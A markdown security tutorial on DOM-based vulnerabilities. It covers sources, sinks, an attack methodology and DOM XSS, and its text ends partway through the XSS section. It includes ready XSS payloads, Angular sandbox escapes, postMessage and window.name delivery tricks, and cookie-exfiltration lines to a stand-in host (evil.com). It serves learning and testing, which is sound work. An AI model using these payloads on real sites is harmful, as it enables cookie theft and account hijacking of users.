
![vul](../../assets/DOM-Based-Vulnerabilities/vul.png)


---

# 📖 **TABLE OF CONTENTS**

### 1. 🧠 What is the DOM?

### 2. 🔄 How the DOM Works — Browser Internals

### 3. 🌊 Taint Flow — Sources & Sinks (The Core Concept)

### 4. 🔌 ALL Sources — Complete List with Explanations

### 5. 🚰 ALL Sinks — Complete List with Danger Levels

### 6. 📊 DOM-Based vs Reflected vs Stored XSS — Comparison

### 7. 🗺️ Attack Methodology — Step-by-Step (5 Phases)

### 8. 🔹 DOM-Based XSS — Full Deep Dive

### 9. 🔹 Open Redirection

### 10. 🔹 Cookie Manipulation

### 11. 🔹 JavaScript Injection

### 12. 🔹 Document-Domain Manipulation

### 13. 🔹 WebSocket-URL Poisoning

### 14. 🔹 Link Manipulation

### 15. 🔹 Web Message Manipulation (postMessage)

### 16. 🔹 Ajax Request-Header Manipulation

### 17. 🔹 Local File-Path Manipulation

### 18. 🔹 Client-Side SQL Injection

### 19. 🔹 HTML5-Storage Manipulation

### 20. 🔹 Client-Side XPath Injection

### 21. 🔹 Client-Side JSON Injection

### 22. 🔹 DOM-Data Manipulation

### 23. 🔹 Denial of Service (DOM-Based)

### 24. 🌐 Controlling the Web Message Source (postMessage Deep Dive)

### 25. 💀 DOM Clobbering — Advanced Technique

### 26. 🛠️ Tools Used for Detection & Exploitation

### 27. 🌍 Real-World Examples & Bug Bounty Cases

### 28. 📋 Quick Reference Cheatsheet

### 29. 🛡️ Prevention — Developer Guide

---
---

# **1. 🧠 What is the DOM ?**

---

## 📌 **Official Definition -**

>**Document Object Model (DOM) -**  
   The **DOM** is the browser’s **structured (like - tree) representation of a web page**, where each HTML element is treated as an **object/node** that JavaScript can read or modify.

> **DOM-based vulnerabilities -**
   These occur when a website’s **JavaScript takes attacker-controlled input (a source)** and sends it into a **dangerous function (a sink)**, allowing the attacker to manipulate the page or execute malicious code.

---

## 🧠 **Simple Analogy — The Blueprint vs. The Real Building**

```
📐 A blueprint (HTML file) is stored on the server — STATIC
🏗️ A building (DOM) is what the browser BUILDS from that blueprint — LIVE
👷 Workers (JavaScript) reshape the building at runtime

Normal Operation:
  Workers follow the architect's original design → building is safe ✅

DOM Attack:
  Attacker sneaks in and gives FAKE instructions to the workers
  Workers are programmed to follow ANY instruction they receive
  → Building becomes dangerous without the original blueprint changing! 💥

🔑 KEY INSIGHT:
  The original server HTML was NEVER changed.
  The attack happened ENTIRELY in the user's browser.
  Server-side defences (WAF, output encoding) often CANNOT stop it.
```

---

## 🔬 **DOM as a Tree Structure**

```
📄 HTML Source:
<html>
  <body>
    <h1>Welcome to the site</h1>
    <div id="output"></div>
    <script>
      var name = location.search;            ← reads from URL  (SOURCE)
      document.getElementById('output')
              .innerHTML = name;              ← writes to DOM   (SINK)
    </script>
  </body>
</html>

🌳 DOM Tree built by browser:
         html
          │
         body
        /    \
      h1    div#output      script
       │         │              │
   "Welcome"  [empty]       reads URL → writes HTML → ⚠️ ATTACK POSSIBLE!
```

---

## 📌 **Why DOM Vulnerabilities Are Special**

```
🔒 Normal Attack (Reflected XSS):
   Attacker → HTTP Request → Server → HTTP Response → Browser
   Payload goes through the server → server can detect + block it

🔓 DOM Attack:
   Attacker → Browser → DOM (direct) → Browser renders attack
   Payload NEVER touches the server → server CANNOT detect it!

This is why DOM-based vulnerabilities are:
  ✅ Hard to detect with server-side security tools
  ✅ Invisible in server logs (especially when using location.hash)
  ✅ Bypass WAF and server-side filters completely
  ✅ Underestimated by many developers and security teams
```

---

# **2. 🔄 How the DOM Works — Browser Internals**

---

## 📌 **The Browser's Parsing Process**

```
Step 1️⃣ → Browser receives HTML from server
          "<html><body><h1>Hello</h1></body></html>"

Step 2️⃣ → HTML Parser converts it into DOM tree
          Document
          └── html
              └── body
                  └── h1 → "Hello"

Step 3️⃣ → CSS is parsed → CSSOM (CSS Object Model) built

Step 4️⃣ → DOM + CSSOM = Render Tree

Step 5️⃣ → JavaScript runs and CAN MODIFY the DOM at any time!
           document.getElementById('h1').innerHTML = 'New Text'
           → DOM is MUTATED in memory
           → Browser re-renders the change immediately

Step 6️⃣ → User sees the MODIFIED page
           NOT the original server HTML anymore
```

---

## 🔑 **The Critical Browser Behavior That Enables DOM Attacks**

```
💡 The URL HASH FRAGMENT (#) is NEVER sent to the server:

URL: https://example.com/page?q=hello#<script>alert(1)</script>
                                       ↑
                                       Everything after # is the FRAGMENT

What server receives:
  GET /page?q=hello HTTP/1.1
  ← Fragment is COMPLETELY STRIPPED — server never sees it!

What browser receives:
  The full URL including the fragment
  JavaScript can read: location.hash = "#<script>alert(1)</script>"
  → If script writes this to DOM → XSS fires!
  → Server logs show nothing → WAF blocks nothing
  → 100% invisible server-side attack ← This is the most dangerous vector
```

---

# **3. 🌊 Taint Flow — Sources & Sinks (The Core Concept)**

---

## 📌 **What is Taint Flow ?**

> **Taint flow** is the path that attacker-controlled data takes from the **entry point** (source) through JavaScript code to the **dangerous execution point** (sink).
> 
> The data is called "tainted" because it has been contaminated by attacker input. If tainted data reaches a dangerous function without being cleaned (sanitized), a vulnerability fires.

---

## 🧠 **Taint Flow Analogy**

```
🧪 Imagine a water treatment facility:

Clean water enters INTAKE (SOURCE)
  ↓
Travels through pipes (JavaScript code)
  ↓
Exits at TAP for citizens (SINK)

Attack scenario:
  Attacker pours POISON into the intake
  No filter exists in the pipes
  EVERYONE who drinks from the tap is harmed 💥

"Taint" = attacker's poison (controlled data)
"Flow"  = the journey through JavaScript code
"Filter" = sanitization / encoding / validation

No filter between SOURCE → SINK = DOM vulnerability!
```

---

## 🔍 **Taint Flow Visual Diagram**

```php
┌───────────────────────────────────────────────────────────────────┐
│                                                                   │
│   ATTACKER                                                        │
│      │                                                            │
│      ▼                                                            │
│  ┌──────────────┐                                                 │
│  │   SOURCE     │  ← e.g., location.search, location.hash,        │
│  │              │       document.referrer, window.name,           │
│  │  Attacker-   │       document.cookie, postMessage data         │
│  │  controlled  │                                                 │
│  │  data enters │                                                 │
│  └──────┬───────┘                                                 │
│         │                                                         │
│         │  JavaScript processes the data                          │
│         │  (tainted data flows through code)                      │
│         │                                                         │
│         ▼                                                         │
│  ┌──────────────┐                                                 │
│  │ SANITIZATION │  ← If this EXISTS → data is CLEANED → Safe ✅   │
│  │    (CHECK)   │    If this MISSING → tainted data flows on      │
│  └──────┬───────┘                                                 │
│         │                                                         │
│         ▼                                                         │
│  ┌──────────────┐                                                 │
│  │    SINK      │  ← e.g., document.write(), innerHTML,           │
│  │              │       eval(), location.href, document.cookie    │
│  │  Dangerous   │                                                 │
│  │  function    │                                                 │
│  │  executes    │                                                 │
│  │  tainted     │                                                 │
│  │  data        │                                                 │
│  └──────┬───────┘                                                 │
│         │                                                         │
│         ▼                                                         │
│      💥 VULNERABILITY FIRES!                                      │
│         XSS / Redirect / Data theft / DoS etc.                    │
│                                                                   │
└───────────────────────────────────────────────────────────────────┘

Real Example:
  SOURCE:  location.search = "?name=<script>alert(document.cookie)</script>"
               │
               ↓ var name = new URLSearchParams(location.search).get('name');
  SINK:    document.write('<h1>Hello ' + name + '</h1>');
               │
               ↓
           💥 <script>alert(document.cookie)</script> EXECUTES!
```

---

## 📌 **The Golden Rule of DOM Vulnerabilities**

```
🥇 GOLDEN RULE:
   ANY path from a SOURCE to a SINK without proper sanitization
   = A DOM-based vulnerability

The equation is simple:
   Source → [No Sanitization] → Sink = 💥 ATTACK!
   Source → [Proper Sanitization] → Sink = ✅ SAFE
```

---

# **4. 🔌 ALL Sources — Complete List with Explanations**

---

## 📌 **What is a Source ?**

> A **source** is any JavaScript property or API that accepts data which is **potentially attacker-controlled**. If an attacker can SET or INFLUENCE the value, and JavaScript READS from it — it is a source.

---

## 📋 **Category 1 — URL-Based Sources (Most Common)**

```r
// ─────────────────────────────────────────────────────────────
// 1. document.URL
//    → Full URL of the current page as a string
//    → Example: "https://site.com/page?q=hello#fragment"
//    → Attacker controls: query string AND hash
document.URL

// ─────────────────────────────────────────────────────────────
// 2. document.documentURI
//    → Identical to document.URL in most browsers
//    → Slightly more standards-compliant version
document.documentURI

// ─────────────────────────────────────────────────────────────
// 3. document.URLUnencoded
//    → Raw URL WITHOUT URL-encoding (Internet Explorer specific)
//    → "%3C" stays as "%3C" in document.URL but
//    → In document.URLUnencoded: "%3C" becomes "<" automatically!
//    → This raw decoding can bypass filters!
document.URLUnencoded  // ⚠️ IE-specific but historically dangerous

// ─────────────────────────────────────────────────────────────
// 4. document.baseURI
//    → The base URL used for all relative links on the page
//    → Can be controlled if attacker can inject <base href="...">
document.baseURI

// ─────────────────────────────────────────────────────────────
// 5. location (full object)
//    → The entire window.location object
//    → Contains: href, protocol, host, hostname, port,
//                pathname, search, hash, origin, assign(), replace()
//    → Attacker controls every component of the URL!
location

// ─────────────────────────────────────────────────────────────
// 6. location.search  ← MOST COMMONLY EXPLOITED
//    → The query string part: everything from "?" onwards
//    → Example URL: https://site.com/?q=<payload>
//    → location.search = "?q=<payload>"
//    → ⚠️ Visible in server logs! Server CAN potentially see it.
location.search

// ─────────────────────────────────────────────────────────────
// 7. location.hash   ← MOST DANGEROUS — INVISIBLE TO SERVER
//    → The fragment part: everything from "#" onwards
//    → Example URL: https://site.com/#<payload>
//    → location.hash = "#<payload>"
//    → 🔴 NEVER sent to server under any circumstances!
//    → Completely invisible to WAF and server logs!
//    → The stealthiest attack vector
location.hash
```

---

## 📋 **Category 2 — Navigation & History Sources**

```r
// ─────────────────────────────────────────────────────────────
// 8. history.pushState
//    → Used by single-page apps to change URL without reload
//    → Can carry state objects that contain attacker-provided data
//    → If app stores user-provided data in history state,
//       it becomes a source on subsequent page views
history.pushState

// ─────────────────────────────────────────────────────────────
// 9. history.replaceState
//    → Same as pushState but replaces current history entry
//    → Same risk: state objects can carry tainted data
history.replaceState
```

---

## 📋 **Category 3 — Document & Reference Sources**

```r
// ─────────────────────────────────────────────────────────────
// 10. document.referrer
//     → The URL of the page that linked to the current page
//     → Attacker can control this by linking from their own site:
//       Step 1: Attacker hosts: <a href="victim.com">click</a>
//       Step 2: Victim clicks → victim.com receives referrer = evil.com
//     → Dangerous if app shows "You came from: [referrer]"
document.referrer

// ─────────────────────────────────────────────────────────────
// 11. window.name  ← VERY DANGEROUS — Persists across navigations!
//     → The name property of the browser window/tab
//     → KEY QUIRK: it PERSISTS even when you navigate to a new page!
//     → An attacker page can:
//       Step 1: Set: window.name = "<img src=1 onerror=alert(1)>"
//       Step 2: Redirect user to victim.com
//       Step 3: victim.com JS reads window.name → it still has payload!
//     → Invisible to server — it's a pure browser property
//     → One of the most powerful and underrated sources
window.name

// How to set window.name as an attacker:
// <iframe name="<img src=1 onerror=fetch('/steal?c='+document.cookie)>"
//         src="https://target.com/page">
// OR simply: <a href="https://target.com" target="<payload>">click</a>
```

---

## 📋 **Category 4 — Storage Sources**

```r
// ─────────────────────────────────────────────────────────────
// 12. localStorage
//     → Browser's persistent key-value storage (survives browser close)
//     → Dangerous when: app writes user input to localStorage
//       AND later reads it back and puts it in a dangerous sink
//     → Creates "Stored DOM XSS" — persists across sessions!
localStorage

// ─────────────────────────────────────────────────────────────
// 13. sessionStorage
//     → Browser's session-scoped key-value storage
//     → Same risk as localStorage but only lasts one session
sessionStorage

// ─────────────────────────────────────────────────────────────
// 14. IndexedDB
//     → Browser's full database system (mozIndexedDB, webkitIndexedDB)
//     → Risk: attacker-controlled data stored in DB,
//       later read into DOM unsafely
IndexedDB  // also: mozIndexedDB, webkitIndexedDB, msIndexedDB

// ─────────────────────────────────────────────────────────────
// 15. Database (client-side)
//     → Any app-specific client-side database implementation
Database
```

---

## 📋 **Category 5 — Cookie Source**

```r
// ─────────────────────────────────────────────────────────────
// 16. document.cookie
//     → All cookies accessible to the current domain
//     → Becomes a source if:
//       → Attacker can set a cookie (via XSS or CSWSH)
//       → AND app reads that cookie and puts it in a sink
//     → Cookie fixation attacks also exploit this
document.cookie
```

---

## 📋 **Category 6 — Web Message Sources**

```r
// ─────────────────────────────────────────────────────────────
// 17. postMessage / Web Message data (e.data)
//     → When pages use postMessage() to communicate cross-origin
//     → The message data (e.data) is entirely attacker-controlled
//       if the receiving page doesn't verify origin
//     → Attacker can send ANY message from ANY domain via iframe
//     → 🔴 Critical — cross-origin attack surface!
window.addEventListener('message', function(e) {
    // e.data  ← this is the source!
    // e.origin ← must be verified! If not → attack possible
})
```

---

## 📋 **Category 7 — Reflected & Stored Data Sources**

```r
// ─────────────────────────────────────────────────────────────
// 18. Reflected Data in JavaScript
//     → Server echoes URL parameters INTO JavaScript variables
//     → Example server response:
//       <script>var username = "REFLECTED_FROM_URL";</script>
//     → If the reflected value contains attacker input and is then
//       used in a dangerous DOM function → Reflected DOM XSS

// ─────────────────────────────────────────────────────────────
// 19. Stored Data in JavaScript
//     → Server reads from database and puts it into JavaScript
//     → Example: user's saved "bio" field put into JS variable
//     → If bio contains payload and it flows to a dangerous sink
//       → Stored DOM XSS
```

---

## 📊 **Source Risk Summary Table**

|#|Source|Attacker Control Level|Server Visibility|Persistence|
|---|---|---|---|---|
|1|`location.search`|✅ Full|❌ Logged by server|❌ Per request|
|2|`location.hash`|✅ Full|✅ **NEVER sent!**|❌ Per request|
|3|`window.name`|✅ Full (cross-nav!)|✅ Invisible|⚠️ Persists nav|
|4|`document.referrer`|⚠️ Partial|❌ Logged|❌ Per request|
|5|`document.cookie`|⚠️ If attacker can set|❌ Sent in requests|✅ Persistent|
|6|`postMessage data`|✅ Full (cross-origin)|✅ Invisible|❌ Per message|
|7|`localStorage`|⚠️ If attacker wrote it|✅ Invisible|✅ **Persists!**|
|8|`sessionStorage`|⚠️ If attacker wrote it|✅ Invisible|⚠️ Session only|

---

# **5. 🚰 ALL Sinks — Complete List with Danger Levels**

---

## 📌 **What is a Sink ?**

> A **sink** is a potentially dangerous JavaScript function or DOM object property that can cause undesirable effects if attacker-controlled (tainted) data is passed to it. This is where the actual harm happens — where tainted data is executed, rendered, or acted upon.

---

## 🔴 **CRITICAL SINKS — Execute JavaScript Directly**

```r
// These sinks take a STRING and execute it as JavaScript code.
// If attacker controls the string → they control the execution.

eval(userInput)
// → Executes argument as JavaScript code
// → eval("alert(document.cookie)") → cookie theft
// → THE most dangerous sink — any JS is possible

Function(userInput)
// → Creates a new function from a string
// → new Function("alert(1)")() → executes alert

setTimeout(userInput, 100)
// → ONLY dangerous when first argument is a STRING (not a function)
// → setTimeout("alert(1)", 100) → executes after 100ms
// → setTimeout(function(){...}, 100) → SAFE version (function, not string)

setInterval(userInput, 100)
// → Same as setTimeout — ONLY dangerous with string argument
// → setInterval("steal(cookies)", 1000) → runs every second!

setImmediate(userInput)
// → Executes string as JS on next iteration of event loop

execCommand(userInput)  // execScript() in IE
msSetImmediate(userInput)
range.createContextualFragment(userInput)
crypto.generateCRMFRequest(userInput)

// 🔑 KEY RULE: If a function takes a STRING and executes it → it's critical
```

---

## 🔴 **CRITICAL SINKS — Inject HTML into the Page**

```r
// These sinks take a STRING and parse it as HTML.
// If attacker injects event handlers → JavaScript executes.

document.write(userInput)
// → Writes raw HTML directly to the document
// → Fully parses HTML → <script> tags EXECUTE
// → OLDEST and most well-known dangerous sink

document.writeln(userInput)
// → Same as document.write() but adds a newline

element.innerHTML = userInput
// → Parses HTML but ⚠️ NOTE: <script> tags DO NOT execute!
// → BUT: <img src=1 onerror=alert(1)> DOES execute!
// → <svg onload=alert(1)> DOES execute!
// → Event handler attributes are the attack vector for innerHTML

element.outerHTML = userInput
// → Same as innerHTML but replaces the entire element

element.insertAdjacentHTML('beforeend', userInput)
// → Inserts parsed HTML at a specified position
// → Same dangers as innerHTML

// JQUERY SINKS (if jQuery is in use on the page):
$(userInput)
// → If input starts with "<" → jQuery creates HTML from it!
// → $('<img src=1 onerror=alert(1)>') → XSS!
// → If it looks like a selector → it finds DOM elements (safer)

$(element).html(userInput)
$(element).append(userInput)
$(element).prepend(userInput)
$(element).after(userInput)
$(element).before(userInput)
$(element).replaceWith(userInput)
// → All jQuery methods that accept HTML strings have the same risk
```

---

## 🟠 **HIGH SEVERITY SINKS — Cause Navigation/Redirect**

```r
// These sinks take a URL-like string and navigate the browser.
// javascript: URIs execute JS. external URLs cause phishing.

location = userInput
location.href = userInput
location.assign(userInput)
location.replace(userInput)
location.pathname = userInput
location.search = userInput
location.hash = userInput
location.hostname = userInput
location.host = userInput
location.protocol = userInput
open(userInput)
element.srcdoc = userInput

// Attack payloads:
// Redirect to phishing: location.href = "https://evil.com"
// Execute JS: location.href = "javascript:alert(1)"
// The javascript: protocol is supported by all major browsers
```

---

## 🟠 **HIGH SEVERITY SINKS — Modify Links and URLs**

```r
// These modify href/src/action attributes of elements.
// Can be used for phishing (redirect), XSS (javascript: URIs),
// or resource hijacking (loading attacker's scripts)

element.href = userInput
element.src = userInput
element.action = userInput
element.setAttribute('href', userInput)
element.setAttribute('src', userInput)
element.setAttribute('action', userInput)
element.setAttribute('data', userInput)

// jQuery versions:
$(element).attr('href', userInput)
$(element).attr('src', userInput)
```

---

## 🟠 **HIGH SEVERITY SINKS — Domain & Protocol Manipulation**

```r
document.domain = userInput
// → Changes the current page's effective domain
// → Used to relax same-origin between subdomains
// → If attacker controls this: weakens browser's security model

new WebSocket(userInput)
// → Opens a WebSocket connection to the specified URL
// → Attacker controls where data is sent
// → All sensitive data sent by app goes to attacker's server

postMessage(userInput, '*')
// → Sends message to another window
// → If targetOrigin is '*' → any domain can receive sensitive data
```

---

## 🟡 **MEDIUM SEVERITY SINKS — Data Storage & Processing**

```r
document.cookie = userInput
// → Sets a cookie
// → Can inject extra cookie attributes (session fixation)
// → Or chain to stored DOM XSS via cookie reflection

localStorage.setItem(key, userInput)
sessionStorage.setItem(key, userInput)
// → Stores data in browser storage
// → Becomes dangerous if the stored data is later read
//   into a dangerous sink (creates Stored DOM XSS chain)

XMLHttpRequest.open(method, userInput)
XMLHttpRequest.send(userInput)
XMLHttpRequest.setRequestHeader(name, userInput)
jQuery.ajax(userInput)
// → Controls outgoing Ajax requests
// → Can send requests to attacker's server
// → Can inject extra headers

FileReader.readAsText(userInput)
FileReader.readAsDataURL(userInput)
FileReader.readAsArrayBuffer(userInput)
// → Controls what file the browser reads

ExecuteSql(userInput)
// → Client-side SQL injection (Web SQL Database API)

document.evaluate(userInput, ...)
// → Client-side XPath injection

JSON.parse(userInput)
// → Client-side JSON injection

RegExp(userInput)
// → If input creates catastrophic backtracking regex → DoS

element.setAttribute(name, userInput)
// → General attribute manipulation — wide range of attacks
```

---

## 📊 **Master Sinks Table — Vulnerability to Sink Mapping**

|🔴 DOM-Based Vulnerability|⚡ Example Sink|💀 Danger Level|
|---|---|---|
|🔴 DOM XSS|`document.write()`|🔴 Critical|
|🔴 DOM XSS|`innerHTML`|🔴 Critical|
|🔴 DOM XSS|`eval()`|🔴 Critical|
|🟠 Open Redirection|`window.location`|🟠 High|
|🟠 Cookie Manipulation|`document.cookie`|🟡 Med → 🔴 Critical|
|🔴 JavaScript Injection|`eval()`|🔴 Critical|
|🟠 Document-Domain Manipulation|`document.domain`|🟠 High|
|🟠 WebSocket-URL Poisoning|`new WebSocket()`|🟠 High|
|🟠 Link Manipulation|`element.src`|🟠 High|
|🔴 Web Message Manipulation|`postMessage()`|🔴 Critical|
|🟠 Ajax Request-Header|`setRequestHeader()`|🟠 High|
|🟠 Local File-Path|`FileReader.readAsText()`|🟠 High|
|🟠 Client-Side SQL Injection|`ExecuteSql()`|🟠 High|
|🟡 HTML5-Storage Manipulation|`sessionStorage.setItem()`|🟡 Med → 🔴 Critical|
|🟠 XPath Injection|`document.evaluate()`|🟠 High|
|🟡 JSON Injection|`JSON.parse()`|🟡 Medium|
|🟡 DOM-Data Manipulation|`element.setAttribute()`|🟡 Medium|
|🟡 Denial of Service|`RegExp()`|🟡 Medium|

---

# **6. 📊 DOM-Based vs Reflected vs Stored XSS — Comparison**

---

```
🖥️  REFLECTED XSS:
  Attacker crafts URL → User clicks → Server echoes payload in response
  → Browser renders the echoed payload → XSS fires
  ✅ Server receives the payload
  ✅ Server logs contain payload
  ✅ WAF can intercept and block
  ✅ "View Source" shows the payload in HTML

🗄️  STORED XSS:
  Attacker submits payload → Server stores in database → Other users view
  → Server renders stored payload → XSS fires
  ✅ Server receives and stores the payload
  ✅ Payload visible in database and server responses
  ✅ WAF can potentially intercept

🌐  DOM-BASED XSS:
  Attacker crafts URL → User opens → Browser's own JavaScript reads URL
  → JavaScript writes payload to DOM → XSS fires
  ❌ Payload may NEVER reach server (especially with location.hash)
  ❌ Server logs may contain NOTHING suspicious
  ❌ WAF may be completely blind to it
  ❌ "View Source" shows original HTML — NOT the attack
  ✅ Developer Tools (Inspector) shows the modified DOM
```

|Feature|🖥️ Reflected|🗄️ Stored|🌐 DOM-Based|
|---|---|---|---|
|Payload sent to server?|✅ Yes|✅ Yes|❌ Usually not|
|Appears in server logs?|✅ Yes|✅ Yes|❌ Often not|
|WAF can detect?|✅ Often|✅ Often|❌ Often not|
|View Source reveals it?|✅ Yes|✅ Yes|❌ No|
|DevTools DOM reveals it?|✅ Yes|✅ Yes|✅ Yes|
|Best hidden via|URL params|Database|URL hash `#`|
|Requires server vuln?|✅ Yes|✅ Yes|❌ No!|
|One victim or many?|One|Many|Many|

---

# **7. 🗺️ Attack Methodology — Step-by-Step (5 Phases)**

---

## 🗺️ **Overview of All 5 Phases**

```js
PHASE 1: 🔍 Find the Source
  → What data does the page JavaScript read from?
  → Can an attacker control that data?
         ↓
PHASE 2: 🔬 Trace the Taint Flow
  → Follow the tainted variable through the code
  → Does it reach a dangerous sink?
  → Is there any sanitization in between?
         ↓
PHASE 3: 🎭 Understand the Context
  → What surrounds the sink?
  → HTML context? JavaScript context? Attribute context?
  → This determines what payload you need
         ↓
PHASE 4: 💉 Craft & Test the Payload
  → Build a payload that breaks out of the context
  → Test it with DevTools or Burp
  → Adjust for any filters/encoding
         ↓
PHASE 5: 📦 Deliver the Exploit
  → How do you make a victim trigger the payload?
  → Via link? Via iframe? Via stored content?
```

---

## 🔧 **PHASE 1 — Finding Sources**

```js
Tool Method 1 — DevTools Search (Manual):
  1. Open the target page in Chrome
  2. Press F12 → Sources tab
  3. Press Ctrl+Shift+F → Opens "Search across all files"
  4. Search for each source keyword:
       location.search
       location.hash
       document.URL
       document.documentURI
       document.referrer
       window.name
       document.cookie
       localStorage.getItem
       sessionStorage.getItem
       addEventListener('message'   ← finds postMessage handlers

Tool Method 2 — Burp DOM Invader (Automated):
  1. Use Burp's embedded browser
  2. DOM Invader is pre-installed
  3. Enable it → click the extension icon → turn ON
  4. Go to Settings → Sources → enable ALL sources
  5. Add a canary value to the URL: ?q=domInvaderKey123
  6. DOM Invader shows ALL locations where canary appears
  7. Identifies sources AND sinks automatically!
  → Best tool for DOM testing

Tool Method 3 — Manual URL Injection:
  1. Add unique canary to URL: ?q=CANARY12345XYZ
  2. Open DevTools → Elements tab
  3. Ctrl+F → search "CANARY12345XYZ" in the DOM
  4. Note where it appears: inside a <script>? Inside an attribute?
  5. That tells you the context → determines your payload
```

---

## 🔧 **PHASE 2 — Tracing Taint Flow**

```js
How to trace in DevTools:

1. Find the source line (e.g., line 42: var name = location.search)
   → Right-click on line number → "Add breakpoint"

2. Reload page with your canary in the URL

3. Execution pauses at breakpoint
   → Hover over variable "name" → shows your canary value ✅
   → Now step through code (F10 = step over, F11 = step into)

4. Watch where the variable goes
   → Gets assigned to another var? Track that one too
   → Passed to a function? Follow it in

5. When variable reaches a sink (e.g., element.innerHTML = name)
   → Execution pauses (if you added breakpoint there)
   → Check: does it contain your canary? → Attack path confirmed!

Code Pattern Recognition:
  var x = location.search;        ← source
  var y = x.split('=')[1];        ← processing (taint moves to y)
  var z = decodeURIComponent(y);  ← processing (taint moves to z)
  document.getElementById('d').innerHTML = z;  ← SINK REACHED!
```

---

## 🔧 **PHASE 3 — Understanding Context**

```js
Context 1: RAW HTML SINK (document.write)
  Output: <div>USER_INPUT</div>
  Can use: <script>alert(1)</script>
  Or: <img src=1 onerror=alert(1)>

Context 2: HTML ATTRIBUTE SINK
  Output: <input value="USER_INPUT">
  Must break out: " onmouseover="alert(1)
  Full result: <input value="" onmouseover="alert(1)">

Context 3: JAVASCRIPT STRING CONTEXT
  Output: var x = 'USER_INPUT';
  Payload: '; alert(document.cookie);//
  Full result: var x = ''; alert(document.cookie);//';

Context 4: JAVASCRIPT FUNCTION ARG
  Output: eval(USER_INPUT)
  Payload: alert(document.cookie)
  Full result: eval(alert(document.cookie))

Context 5: URL/HREF CONTEXT
  Output: <a href="USER_INPUT">link</a>
  Payload: javascript:alert(1)
  Full result: <a href="javascript:alert(1)">link</a>

Context 6: innerHTML SINK (no <script>!)
  ❌ WRONG: <script>alert(1)</script>  ← won't work in innerHTML!
  ✅ RIGHT: <img src=1 onerror=alert(1)>
  ✅ RIGHT: <svg onload=alert(1)>
  ✅ RIGHT: <body onresize=alert(1)>
  ✅ RIGHT: <details open ontoggle=alert(1)>
```

---

## 🔧 **PHASE 4 — Crafting Payloads**

```HTML
// Context-specific payloads:

// 1. document.write() — raw HTML, <script> works:
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>    // if wrapped in attribute

// 2. innerHTML — NO <script>! Use event handlers:
?q=<img src=1 onerror=alert(document.domain)>
?q=<svg onload=alert(1)>
?q=<details open ontoggle=alert(1)>

// 3. eval() / setTimeout(str) / setInterval(str):
?q=alert(document.cookie)
?q=fetch('https://evil.com/?c='+document.cookie)

// 4. location / location.href:
?q=javascript:alert(1)                  ← executes JS
?q=https://evil.com                     ← phishing redirect
#https://evil.com                        ← via hash (invisible!)

// 5. jQuery $() with hash:
#<img src=1 onerror=alert(1)>            ← jQuery creates element

// 6. Angular template injection (if ng-app present):
{{constructor.constructor('alert(1)')()}}

// 7. AngularJS sandbox escape:
{{$on.constructor('alert(1)')()}}
```

---

## 🔧 **PHASE 5 — Delivering the Exploit**

```js
Method 1: Malicious URL (for location.search attacks):
  Attacker sends: https://victim.com/?q=<script>alert(1)</script>
  → Victim clicks link → DOM writes unescaped payload → XSS!

Method 2: URL with Hash (for location.hash attacks):
  Attacker sends: https://victim.com/#<img src=1 onerror=alert(1)>
  → Server receives: GET / HTTP/1.1 (hash stripped!)
  → Browser reads location.hash → DOM writes payload → XSS!
  → Completely invisible to server-side defenses!

Method 3: iframe (for postMessage attacks):
  Attacker hosts on evil.com:
  <iframe src="//victim.com"
          onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
  → iframe loads victim page
  → onload sends malicious postMessage
  → victim.com handler processes it → XSS!

Method 4: Stored Payload (for storage-based attacks):
  Step 1: Attacker visits: victim.com/?theme=<img src=1 onerror=alert(1)>
  Step 2: App stores payload in localStorage
  Step 3: Every user who visits the page → reads localStorage → XSS fires!

Method 5: window.name trick:
  Attacker hosts:
  <a href="https://victim.com" target="<img src=1 onerror=alert(1)>">
    Click here for prize!
  </a>
  → Victim clicks → opens victim.com with window.name = payload
  → victim.com reads window.name → XSS!
```

---

# **8. 🔹 DOM-Based XSS — Full Deep Dive**

---

## 📌 **What is DOM-Based XSS ?**

> DOM-based XSS arises when **JavaScript takes data from an attacker-controllable source** (such as the URL) and **passes it to a sink that supports dynamic code execution** (such as `eval()` or `innerHTML`). This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
> 
> The key differentiator: **no interaction with the server is needed to trigger execution.** Everything happens inside the browser.

---

## 🧠 **The Fundamental Mechanism**

```
Without DOM XSS:
  URL: https://site.com/search?q=shoes
  JavaScript: document.write("Results for: shoes")
  → Shows: "Results for: shoes" ✅ Safe

With DOM XSS:
  URL: https://site.com/search?q=<script>alert(1)</script>
  JavaScript: document.write("Results for: " + location.search)
  → Shows: "Results for: " AND EXECUTES alert(1)! 💥
```

---

## 💉 **Exploitation by Sink Type**

### 🔴 **Sink 1 - document.write()**

```HTML
// Vulnerable code pattern:
var query = new URLSearchParams(location.search).get('search');
document.write('<img src="/search?q=' + query + '">');

// What developer expected:
// /search?q=shoes  → <img src="/search?q=shoes">

// What attacker sends:
// ?search="><script>alert(document.domain)</script>
// Result: <img src="/search?q="><script>alert(document.domain)</script>">
// → The <img src is broken, the script tag is now in HTML → EXECUTES! 💥

// Another common pattern:
function trackSearch(query) {
    document.write('<img src="/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) { trackSearch(query); }

// Payload: ?search="><img src=1 onerror=alert(1)>
```

---

### 🔴 **Sink 2 - innerHTML**

```r
// Vulnerable code:
var search = document.getElementById('searchInput').value;
document.getElementById('results').innerHTML = 'Results for: ' + search;
// OR from URL:
document.getElementById('results').innerHTML = location.search.split('=')[1];

// ⚠️ CRITICAL NOTE: innerHTML DOES NOT execute <script> tags!
// This DOES NOT work in innerHTML:
// <script>alert(1)</script>  ← browsers ignore script in innerHTML

// These DO work in innerHTML (event handler based):
// Payload 1 — img error handler:
<img src=1 onerror=alert(document.domain)>

// Payload 2 — SVG onload:
<svg onload=alert(1)>

// Payload 3 — details element:
<details open ontoggle=alert(1)>

// Payload 4 — video element:
<video><source onerror="alert(1)">

// Payload 5 — iframe srcdoc:
<iframe srcdoc="<script>alert(1)</script>">
// ^ This DOES execute scripts — it's a nested document!
```

---

### 🔴 **Sink 3 - location.hash → innerHTML (Invisible to Server !)**

```HTML
// Vulnerable code:
document.getElementById('title').innerHTML = location.hash.slice(1);
// OR:
var tab = location.hash.substring(1);
document.getElementById('content').innerHTML = tab;

// Attack URL (hash NEVER reaches server!):
https://victim.com/page#<img src=1 onerror=alert(document.domain)>

// location.hash = "#<img src=1 onerror=alert(document.domain)>"
// .slice(1) removes the "#"
// innerHTML sets: <img src=1 onerror=alert(document.domain)>
